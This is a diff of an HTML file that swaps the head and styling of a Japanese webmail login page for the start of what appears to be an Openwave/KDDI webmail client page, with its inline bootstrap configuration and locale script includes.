@@ -1,450 +1,246 @@
-<!DOCTYPE html>
-<html lang="ja">
-
+<!DOCTYPE HTML>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="IE=10" />
-    <title>CPI ウェブメールログイン</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    
+                       <meta charset="UTF-8">
+                       <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                    
+    
 
-        html, body {
-            width: 100%;
-            height: 100%;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-        }
 
-        body {
-            background: linear-gradient(135deg, #f5f5f5 0%, #efefef 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
 
-        .login-container {
-            background: white;
-            border-radius: 4px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            padding: 60px 50px;
-            width: 100%;
-            max-width: 380px;
-            text-align: center;
-        }
+<script language="Javascript1.1">
+    function getBootstrapConfig() {
+        return "<bootstrap><common><boolean_showDateFormat value=\"false\" \/><string_redirectLogoutUrl value=\"index.html\" \/><number_windowStateSaveDelay value=\"-1\" \/><string_defaultTimeZone value=\"Asia\/Tokyo\" \/><string_logourl value=\"http:\/\/owmessaging.com\" \/><string_mediastreamerappname value=\"\/mediastreamer\/voicemail\/\" \/><number_minuteScale value=\"5\" \/><string_redirectLoginUrl value=\"\" \/><string_helpurlfortouch value=\"help\/Default.htm\" \/><xml_footerLinks value=\"&lt;footerLinks&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/emailmanagement&quot; text=&quot;MANAGE_YOUR_MAIL&quot; \/&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/contact&quot; text=&quot;CONTACT_US&quot; \/&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/feedback&quot; text=&quot;SEND_US_FEEDBACK&quot; \/&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/privacy-policy&quot; text=&quot;PRIVACY_POLICY&quot; \/&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/terms-and-conditions&quot; text=&quot;TERMS_CONDITIONS&quot; \/&gt;&#xD;&#xA;            &#xD;&#xA;            &lt;link href=&quot;help\/touch\/index.html&quot; text=&quot;HELP&quot; \/&gt;&#xD;&#xA;        &lt;\/footerLinks&gt;\" \/><xml_skins value=\"&lt;skins \/&gt;\" \/><string_mediastreamerport value=\"8080\" \/><string_desktopappurl value=\"index.jsp\" \/><number_failedLoginLimit value=\"-1\" \/><number_userInactiveTimeout value=\"120000\" \/><string_userDomain value=\"mx.internal\" \/><number_adRotationInterval value=\"30000\" \/><boolean_showTasksApp value=\"true\" \/><string_feedbacktarget value=\"\" \/><string_defaultDateFormat value=\"DD\/MM\/YYYY\" \/><boolean_showLanguageSetting value=\"false\" \/><string_redirectTimeoutUrl value=\"index.html\" \/><string_advertisementLink value=\"\" \/><string_mediastreamer value=\"localhost\" \/><string_searchResultTargetWindowName value=\"searchResult\" \/><string_helpurl value=\"help\/Default.htm\" \/><xml_dataValidation value=\"&lt;dataValidation&gt;&#xD;&#xA;                &lt;phone regexp=&quot;^[\\w-#\\(\\)\\+\\\/\\.\\*]{0,20}$&quot; \/&gt;&#xD;&#xA;                &lt;pager regexp=&quot;^[0-9]{0,50}$&quot; \/&gt;&#xD;&#xA;            &lt;\/dataValidation&gt;\" \/><xml_fileTypesDisplayAudioPlayer value=\"&lt;fileTypesDisplayAudioPlayer&gt;&#xD;&#xA;                &lt;Firefox&gt;ogg&lt;\/Firefox&gt;&#xD;&#xA;                &lt;Safari&gt;mpeg,mp3&lt;\/Safari&gt;&#xD;&#xA;                &lt;IE&gt;mpeg,mp3&lt;\/IE&gt;&#xD;&#xA;                &lt;Chrome&gt;mpeg,mp3&lt;\/Chrome&gt;&#xD;&#xA;            &lt;\/fileTypesDisplayAudioPlayer&gt;\" \/><number_warnBeforeTokenExpiresTime value=\"120000\" \/><string_services value=\"mail.vacationMessage-json,notification-json,mail.message-json,mail,datastore,serviceProfile-json,mediaTranscoderErrorReporter,mail.mobileSignature-json,calendar.share-json,mail.folder-json,mail.category.message-json,log-json,mailFilter,mailSignature,mobileMailSignature,captcha-json,mail.externalAccount-json,mailVacationMessage,mail.trustedSender-json,version-json,auth-json,clientconfig-json,calendar.toDo-json,calendar-json,trustedsender,mail.signature-json,blockedsender,mailAlias,mail.alias-json,storage.account-json,calendar.preference-json,device-json,mail.userControls-json,mailExternalAccount.oauth2code-json,log,calendar.reminderaddress-json,mail.preference-json,timezone,storage.file-json,contacts.addressBook-json,mailPreference,bootstrap,bootstrap-json,sms-json,mailJunkPreference,noop,mail.message.attachment-json,auth.nc-json,resource-json,noop-json,calendar.taskList-json,allowedsender,mailExternalAccount,mail.blockedSender-json,user-json,addressbooks,metrics-json,mail.junkPreference-json,storage.authentication-json,contacts-json,api-json,pickup-json,mailForwarding,calendar,calendar.event-json,datastore-json,autocomplete,oembed,storage.folder-json,mail.attachmentView-json,smsAccount-json,prefs,mail.collectedAddress-json,mail.allowedSender-json,prefs-json,fileUpload-json,officePreview-json,timezone-json,user,contacts,mail.filter-json,mail.forwarding-json\" \/><\/common><upload><number_maxBatchSize value=\"1073741824\" \/><number_maxFileSize value=\"-1\" \/><\/upload><mail><xml_specialFolders value=\"&lt;specialFolders caseSensitive=&quot;true&quot; useServerTypes=&quot;false&quot;&gt;&#xD;&#xA;            &lt;inbox name=&quot;Inbox&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;            &lt;draft name=&quot;Drafts&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;            &lt;sent name=&quot;Sent&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;            &lt;junk name=&quot;Junk&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;            &lt;trash name=&quot;Trash&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;&#x9;&lt;\/specialFolders&gt;\" \/><number_maxuploadbytes value=\"104857600\" \/><number_maxallowedsenders value=\"10\" \/><xml_autoCheck value=\"&lt;autoCheck&gt;&#xD;&#xA;                &lt;interval value=&quot;0&quot;&gt;sdk.mail.autoCheck.manually&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;60&quot;&gt;sdk.mail.autoCheck.everyMinute&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;300&quot;&gt;sdk.mail.autoCheck.everyFiveMinutes&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;900&quot;&gt;sdk.mail.autoCheck.everyFifteenMinutes&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;1800&quot;&gt;sdk.mail.autoCheck.everyThirtyMinutes&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;3600&quot;&gt;sdk.mail.autoCheck.everyHour&lt;\/interval&gt;&#xD;&#xA;            &lt;\/autoCheck&gt;\" \/><number_maxblockedsenders value=\"10\" \/><number_autoSaveTime value=\"60000\" \/><string_includedDomain value=\"\" \/><number_emailMaximum value=\"104857600\" \/><boolean_vacationMessageReplyOption value=\"false\" \/><xml_externalmailbox value=\"&lt;externalmailbox pop=&quot;true&quot; imap=&quot;true&quot; smtp=&quot;local&quot; accountLimit=&quot;12&quot; useExternalServerTypes=&quot;false&quot;&gt;&#xD;&#xA;                &lt;service name=&quot;aol&quot; display=&quot;AOL (POP)&quot; type=&quot;pop&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.aol.com&quot; port=&quot;587&quot; \/&gt;&lt;!-- only used when smtp=remote --&gt;&#xD;&#xA;                    &lt;protocol type=&quot;pop&quot; server=&quot;pop.aol.com&quot; port=&quot;110&quot; usessl=&quot;false&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;                &lt;service name=&quot;aol&quot; display=&quot;AOL (IMAP)&quot; type=&quot;imap&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.aol.com&quot; port=&quot;587&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;imap&quot; server=&quot;imap.aol.com&quot; port=&quot;143&quot; usessl=&quot;false&quot; \/&gt;&#xD;&#xA;                    &lt;imapFolderMapping imapDrafts=&quot;Drafts&quot; imapSent=&quot;Sent Items&quot; imapTrash=&quot;Trash&quot; imapJunk=&quot;Junk&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;&#xD;&#xA;                &lt;service name=&quot;gmail&quot; display=&quot;Google GMail (POP)&quot; type=&quot;pop&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.gmail.com&quot; port=&quot;465&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;pop&quot; server=&quot;pop.gmail.com&quot; port=&quot;995&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;                &lt;service name=&quot;gmail&quot; display=&quot;Google GMail (IMAP)&quot; type=&quot;imap&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.gmail.com&quot; port=&quot;587&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;imap&quot; server=&quot;imap.gmail.com&quot; port=&quot;993&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;imapFolderMapping imapDrafts=&quot;[Gmail]\/Drafts&quot; imapSent=&quot;[Gmail]\/Sent Mail&quot; imapTrash=&quot;[Gmail]\/Trash&quot; imapJunk=&quot;[Gmail]\/Spam&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;&#xD;&#xA;                &lt;service name=&quot;yahoo&quot; display=&quot;Yahoo! Plus (POP)&quot; type=&quot;pop&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.mail.yahoo.com&quot; port=&quot;465&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;pop&quot; server=&quot;pop.mail.yahoo.com&quot; port=&quot;995&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;                &lt;service name=&quot;yahoo&quot; display=&quot;Yahoo! Plus (IMAP)&quot; type=&quot;imap&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.mail.yahoo.com&quot; port=&quot;465&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;imap&quot; server=&quot;imap.mail.yahoo.com&quot; port=&quot;993&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;imapFolderMapping imapDrafts=&quot;Draft&quot; imapSent=&quot;Sent&quot; imapTrash=&quot;Trash&quot; imapJunk=&quot;Bulk Mail&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;&#xD;&#xA;                &lt;defaultImapFolderMapping imapDrafts=&quot;Drafts&quot; imapSent=&quot;Sent&quot; imapTrash=&quot;Trash&quot; imapJunk=&quot;Junk&quot; \/&gt;&#xD;&#xA;                &lt;popUidHeaderName value=&quot;X-POP-UID&quot; \/&gt;&#xD;&#xA;            &lt;\/externalmailbox&gt;\" \/><number_maxtrustedsenders value=\"10\" \/><number_headerfetchcount value=\"100\" \/><\/mail><contacts><boolean_allowDuplicateGroupName value=\"true\" \/><number_maxAddressBookLabelLength value=\"32\" \/><number_maxAddressBooks value=\"1000\" \/><number_maxMailingListLabelLength value=\"100\" \/><number_pagesize value=\"300\" \/><boolean_enableGroupContacts value=\"true\" \/><boolean_enableGroupEmails value=\"true\" \/><boolean_enableCollectedEmails value=\"true\" \/><boolean_enableCreateAddressBooks value=\"true\" \/><string_contactitemDisplayTypes value=\"lzEmail\" \/><string_contactMinimumRequiredSection value=\"lzEmail\" \/><string_mapRootURL value=\"http:\/\/maps.googleapis.com\/maps\/api\/js?sensor=false\" \/><xml_directoryServices value=\"&lt;directoryServices limit=&quot;10&quot;&gt;&#xD;&#xA;            &lt;service name=&quot;example&quot; display=&quot;Directory Service&quot;&gt;&#xD;&#xA;                &lt;connectivity server=&quot;ldap.example.com&quot; port=&quot;389&quot; \/&gt;&#xD;&#xA;                &lt;protocol baseDn=&quot;dc=com&quot; scope=&quot;subtree&quot; maxResults=&quot;100&quot; \/&gt;&#xD;&#xA;                &lt;authentication secure=&quot;false&quot; login=&quot;false&quot; bindDn=&quot;&quot; bindPassword=&quot;&quot; \/&gt;&#xD;&#xA;            &lt;\/service&gt;&#xD;&#xA;        &lt;\/directoryServices&gt;\" \/><number_maxCollectedEmails value=\"10000\" \/><xml_contactForm value=\"&lt;contactForm forceAllFieldsVisible=&quot;true&quot; addFieldControl=&quot;selectionList&quot;&gt;&#xD;&#xA;                &lt;section type=&quot;lzHeader&quot; showmiddlename=&quot;false&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;phoneticlastname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;lastname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;phoneticfirstname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;firstname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;middlename&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;nickname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;title&quot; displayByDefault=&quot;false&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;department&quot; displayByDefault=&quot;false&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;company&quot; displayByDefault=&quot;false&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;               &lt;section type=&quot;lzEmail&quot; title=&quot;Email&quot; validator=&quot;email&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; defaultEmail=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzPhone_mobile&quot; title=&quot;Mobile&quot; validator=&quot;phone&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzPhone&quot; title=&quot;Phone&quot; validator=&quot;phone&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzAddress&quot; title=&quot;Address&quot; groupLabel=&quot;home,work,other&quot; showmap=&quot;true&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;zip&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;state&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;city&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;street&quot; type=&quot;textarea&quot; rows=&quot;2&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;country&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzPersonal&quot; title=&quot;Personal&quot; allowDuplicates=&quot;false&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;birthday&quot; type=&quot;date&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;anniversary&quot; type=&quot;date&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzPhone_fax&quot; title=&quot;Fax&quot; validator=&quot;phone&quot; displayByDefault=&quot;false&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzWeb&quot; title=&quot;Website&quot; displayByDefault=&quot;false&quot; validator=&quot;url&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;!-- The optional section as a placeholder of job related optional fields in header section. --&gt;&#xD;&#xA;                &lt;!-- &lt;section title=&quot;Job&quot; displayByDefault=&quot;false&quot; \/&gt; --&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzNote&quot; title=&quot;Notes&quot; displayByDefault=&quot;false&quot; allowDuplicates=&quot;false&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;notes&quot; type=&quot;textarea&quot; maxlength=&quot;10240&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;            &lt;\/contactForm&gt;\" \/><number_delLargeContactWarning value=\"50\" \/><boolean_enableMailingList value=\"false\" \/><boolean_enableContactDeduplication value=\"true\" \/><\/contacts><calendar><number_weekstart value=\"7\" \/><boolean_enableFreeBusyStatus value=\"false\" \/><boolean_showpublishedcalendar value=\"true\" \/><number_maxeventnamelength value=\"64\" \/><boolean_rsvpEnabled value=\"true\" \/><number_daystart value=\"8\" \/><number_maxuploadbytes value=\"5242880\" \/><xml_recurrence value=\"&lt;recurrence&gt;&#xD;&#xA;                &lt;repeat value=&quot;never&quot; label=&quot;Locale.calendar.editorView.recurrence.NEVER&quot; \/&gt;&#xD;&#xA;                &lt;repeat value=&quot;daily&quot; label=&quot;Locale.calendar.editorView.recurrence.DAILY&quot; \/&gt;&#xD;&#xA;                &lt;repeat value=&quot;weekly&quot; label=&quot;Locale.calendar.editorView.recurrence.WEEKLY&quot; \/&gt;&#xD;&#xA;                &lt;repeat value=&quot;monthly&quot; label=&quot;Locale.calendar.editorView.recurrence.MONTHLY&quot; \/&gt;&#xD;&#xA;                &lt;repeat value=&quot;yearly&quot; label=&quot;Locale.calendar.editorView.recurrence.YEARLY&quot; \/&gt;&#xD;&#xA;            &lt;\/recurrence&gt;\" \/><string_allowCalDomain value=\"mirapoint.qa.laszlosystems.com,test.com\" \/><number_maxsubscriptions value=\"10\" \/><boolean_showsharedcalendar value=\"true\" \/><number_maxcalendarnamelength value=\"767\" \/><number_dayend value=\"18\" \/><number_maxeventnoteslength value=\"4096\" \/><number_maxRepSingleEvent value=\"50\" \/><\/calendar><extensionnametypemap><xml_extensionNameTypeMap value=\"&lt;extensionNameTypeMap&gt;&#xD;&#xA;        &lt;!-- Images --&gt;&#xD;&#xA;        &lt;item type=&quot;img_generic&quot; preview=&quot;true&quot; transcode=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                jpg,jpeg&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;img_png&quot; preview=&quot;true&quot; transcode=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                png&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;img_gif&quot; preview=&quot;true&quot; transcode=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                gif&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;psd&quot; preview=&quot;false&quot; transcode=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                psd&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;!-- Preview with media server --&gt;&#xD;&#xA;        &lt;item type=&quot;doc&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                doc,docm,docx,dotm,dotx,rtf,xlt&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;txt&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                txt&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;ppt&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                ppt,pot,potm,potx,pps,pptx&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;sheets&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                xls,xlsb,xlsm,xlsx,xlt,xltm,xltx,xlw&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;pdf&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                pdf&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;java&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                java&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;!-- Client support preview --&gt;&#xD;&#xA;        &lt;item type=&quot;eml&quot; preview=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                eml&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;ics&quot; preview=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                ics&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;vcf&quot; preview=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                vcf&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;!-- Media file types --&gt;&#xD;&#xA;        &lt;item type=&quot;audio&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                mp3,wav&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;mov&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                mov&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;video&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                mp4,3gp,3g2,mpeg,avi&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;!-- Not support preview --&gt;&#xD;&#xA;        &lt;item type=&quot;zip&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                zip,rar,7z,tar,iso&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;exe&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                exe&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;mms&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                mms&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;    &#xD;&#xA;            &lt;item type=&quot;xml&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;                &lt;extensionNames&gt;&#xD;&#xA;                    xml&#xD;&#xA;                &lt;\/extensionNames&gt;&#xD;&#xA;            &lt;\/item&gt;&#xD;&#xA;            &lt;item type=&quot;csv&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;                &lt;extensionNames&gt;&#xD;&#xA;                    csv&#xD;&#xA;                &lt;\/extensionNames&gt;&#xD;&#xA;            &lt;\/item&gt;&#xD;&#xA;        &lt;\/extensionNameTypeMap&gt;\" \/><\/extensionnametypemap><\/bootstrap>";
+    }
 
-        .logo-container {
-            margin-bottom: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-
-        .logo-container svg {
-            height: 50px;
-            width: auto;
-        }
-
-        .logo-text {
-            font-size: 20px;
-            font-weight: 600;
-            color: #333;
-            letter-spacing: 1px;
-        }
-
-        .form-wrapper {
-            display: flex;
-            flex-direction: column;
-            gap: 0;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #ddd;
-            font-size: 13px;
-            font-family: inherit;
-            background: white;
-            color: #333;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            margin-bottom: 0;
-        }
-
-        .form-input::placeholder {
-            color: #999;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #0072c6;
-            box-shadow: 0 0 0 3px rgba(0, 114, 198, 0.1);
-        }
-
-        .form-input:first-of-type {
-            border-radius: 2px 2px 0 0;
-        }
-
-        .form-input:last-of-type {
-            border-radius: 0 0 2px 2px;
-            margin-bottom: 24px;
-        }
-
-        .form-input + .form-input {
-            border-top: none;
-        }
-
-        .loader {
-            display: none;
-            gap: 8px;
-            width: fit-content;
-            margin: 0 auto 20px;
-            flex-direction: row-reverse;
-            justify-content: center;
-        }
-
-        .loader div {
-            width: 6px;
-            height: 6px;
-            background-color: #0072c6;
-            border-radius: 50%;
-            animation: pulse 1.4s ease-in-out infinite;
-        }
-
-        .loader div:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-
-        .loader div:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                opacity: 0.3;
-            }
-            50% {
-                opacity: 1;
+    /**
+     * Utility which recursively merges one object into an existing object.
+     * This is used for overlaying locales and custom configs before Ext.Object.merge
+     * being available. If the object has 'overwrite' property defined, object overwriting will be performed
+     * instead of merging.
+     */
+    function mergeObj (obj1, obj2) {
+        for (var p in obj2) {
+            try {
+                if ((obj2[p].constructor == Object) && (obj2[p].overwrite != true)) {
+                    obj1[p] = mergeObj(obj1[p], obj2[p]);
+                } else {
+                    obj1[p] = obj2[p];
+                }
+            } catch(e) {
+                obj1[p] = obj2[p];
             }
         }
 
-        .error-message {
-            display: none;
-            background: #fff3cd;
-            color: #856404;
-            padding: 12px 14px;
-            border-radius: 3px;
-            margin-bottom: 16px;
-            font-size: 12px;
-            border: 1px solid #ffeaa7;
-            text-align: left;
-        }
+        return obj1;
+    }
+</script>
 
-        .login-btn {
-            width: 100%;
-            padding: 12px 24px;
-            background: #0072c6;
-            color: white;
-            border: none;
-            border-radius: 2px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 12px;
-        }
+    <!-- Load client config, custom settings, and localization.
+         The order of these files is not interchangable. -->
+    <script type="text/javascript" src="client-config.js?v=KDDIUX_1.2-2" charset="UTF-8"></script>
+    <script type="text/javascript" src="custom-config.js?v=KDDIUX_1.2-2" charset="UTF-8"></script>
+    <script type="text/javascript" src="resources/locale/localization.js?v=KDDIUX_1.2-2"></script><script type="text/javascript" src="resources/locale/sdk/ja_JP.js" charset="UTF-8"></script><script type="text/javascript" src="resources/locale/custom/ja_JP.js" charset="UTF-8"></script><script type="text/javascript" src="resources/locale/custom/kwc_custom_ja_JP.js" charset="UTF-8"></script><script type="text/javascript" src="resources/locale/custom/kwc_ja_JP.js" charset="UTF-8"></script>
+    <script type="text/javascript" src="ckdevice.js?v=KDDIUX_1.2-2"></script>
+    
+    
+	<!-- KDDIUX-20 -->
+<script type="text/javascript">
 
-        .login-btn:hover:not(:disabled) {
-            background: #005ba3;
-        }
